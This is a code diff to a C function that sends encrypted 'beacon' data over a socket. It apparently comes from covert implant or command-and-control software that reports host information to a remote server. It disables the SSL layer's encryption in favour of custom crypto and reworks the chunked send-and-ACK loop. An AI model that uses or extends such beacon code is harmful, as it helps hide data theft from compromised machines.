@@ -609,7 +609,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	DLX(4, printf("\tHandshake Complete!\n"));
 
-	//turn off the ssl encryption since we us our own
+	//turn off the ssl encryption since we use our own
 	ssl.do_crypt = 0;
 
 	//generate 32 random bytes
@@ -660,37 +660,23 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//while we haven't sent all data keep going
 	//send size embedded in rand data
 	//send encrypted data
-	do 
-	{
+	do {
+
 		//embed the data size so the server knows how much data to read
-		if( (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE)
-		{
-			sz_to_send = MAX_SSL_PACKET_SIZE;
-		} 
-		else
-		{
-			sz_to_send = encrypt_size - bytes_sent;
-		}
+		sz_to_send = (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE ? MAX_SSL_PACKET_SIZE : encrypt_size - bytes_sent;
 		DLX(4, printf("\tSending: %d bytes\n", sz_to_send));
 
-		//reset the buffer
-		memset(randData, 0, 64);
-
 		retval = crypt_write( &ssl, enc_buf + bytes_sent, sz_to_send);
-		if( retval < 0)
-		{
+		if( retval < 0) {
 			DLX(4, printf("\tcrypt_write() failed with error: %0x\n", retval));
 			retval = FAILURE;
 			goto EXIT;
 		}
 
-		bytes_sent += retval;
-		DLX(4, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size-bytes_sent));
-
-		//receive ack
+		// Receive ACK
 		memset(recv_buf, 0, 30);
 
-		retval = recv(sock, recv_buf,30,0);
+		retval = recv(sock, recv_buf, 30, 0);
 		if (retval < 0)
 		{
 			DLX(4, printf( "\tReceive failed:"));
@@ -703,7 +689,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
 		DLX(4, printf("\tACKed bytes: %d\n", recv_sz));
 		bytes_sent += recv_sz;
-
+		DLX(4, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size-bytes_sent));
 	} while (bytes_sent < encrypt_size);
 
 	retval = SUCCESS;
